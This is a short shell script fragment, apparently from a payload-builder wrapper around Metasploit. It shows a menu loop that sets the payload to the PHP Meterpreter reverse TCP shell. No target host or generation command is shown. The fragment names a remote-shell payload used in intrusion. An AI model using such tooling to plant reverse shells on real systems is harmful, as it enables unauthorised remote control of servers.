PHP_Meter_RevTcp=php/meterpreter_reverse_tcp

PAYLOADVALID=false
until [ "$PAYLOADVALID" == true ]
do
    clear
    echo "[ Payloads ]"
    echo "[i] 1 - Meterpreter Reverse TCP"
    echo ""
    Input "[i] Select Payload: " 
    PAYLOAD=$UserInput
        case $PAYLOAD in
                    1)
                        PAYLOAD=$PHP_Meter_RevTcp
                        PAYLOADVALID=true
                    ;;
                    *)
                        PAYLOADVALID=false
        esac
done
ARCH="-"
